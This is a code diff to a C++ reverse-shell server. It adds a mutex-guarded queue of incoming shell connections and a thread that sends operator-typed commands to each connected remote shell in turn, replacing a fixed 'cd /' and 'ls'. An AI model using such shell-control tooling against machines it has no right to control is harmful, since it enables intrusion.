@@ -20,16 +20,67 @@
  */
 #include "pstream.h"
 #include <iostream>
+#include <iomanip>
+#include <deque>
+#include <mutex>
+#include <thread>
 #include <clara.hpp>
 #include "reverseshell/Server.h"
 #include "reverseshell/Connection.h"
 
+std::deque<reverseshell::Connection> connections;
+std::mutex connectionsMutex;
+std::thread inputThread;
+
+void userInputLoop()
+{
+	while( true )
+	{
+		try
+		{
+			reverseshell::Connection connection;
+			{
+				std::lock_guard<std::mutex> connectionsLock(connectionsMutex);
+				if( connections.empty() ) break;
+				connection=connections.front();
+				connections.pop_front();
+				std::cout << "Connecting terminal to next connection (" << connections.size() << " more connection(s) available)"  << std::endl;
+			}
+
+			std::string input;
+			while( true )
+			{
+				input.clear();
+				std::cout << "\nconn> ";
+				std::cin >> input;
+				if( std::cin.eof() )
+				{
+					std::cout << "\nGot EOF" << std::endl;
+					std::cin.clear();
+					connection.send("");
+					break;
+				}
+				connection.send(input+"\n");
+			}
+		}
+		catch( const std::exception& error )
+		{
+			std::cerr << "Exception from connection: " << error.what() << std::endl;
+		}
+	}  // End of loop over connections
+	std::cout << "Input loop finished" << std::endl;
+}
+
 void newConnectionCallback( reverseshell::Connection& connection )
 {
-	std::cout << "New connection" << std::endl;
-	connection.send( "cd /\n" );
-	connection.send( "ls\n" );
-	connection.send( "" );
+	std::cout << "New connection (" << connections.size()+1 << " connection(s) available)"  << std::endl;
+	std::lock_guard<std::mutex> connectionsLock(connectionsMutex);
+	connections.emplace_back( connection );
+	if( connections.size()==1 )
+	{
+		if( inputThread.joinable() ) inputThread.join();
+		inputThread=std::thread( userInputLoop );
+	}
 }
 
 
